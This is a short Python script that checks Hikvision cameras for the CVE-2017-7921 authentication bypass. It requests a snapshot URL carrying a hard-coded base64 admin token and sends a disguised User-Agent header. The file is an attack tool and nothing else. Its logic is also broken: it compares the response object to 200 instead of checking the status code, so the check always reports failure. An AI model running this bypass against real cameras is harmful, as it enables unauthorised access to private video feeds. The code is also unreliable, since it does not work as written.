import requests
import logging


# CVE-2017-7921 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7921

def access_bypass_hikvision(url: str, verify: bool = True, timeout: int | float = 10) -> bool:
    headers = {"User-Agent": "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"}
    
    try:
        target_url = url + "/onvif-http/snapshot?auth=YWRtaW46MTEK"
        response = requests.get(target_url, headers=headers, verify=verify, timeout=timeout)
        
        if response == 200:
            return True
        
        else:
            return False
    
    except Exception as e:
        logging.error(e)